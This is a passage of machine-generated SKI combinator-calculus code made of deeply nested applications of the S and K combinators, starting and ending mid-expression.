))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K))))((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)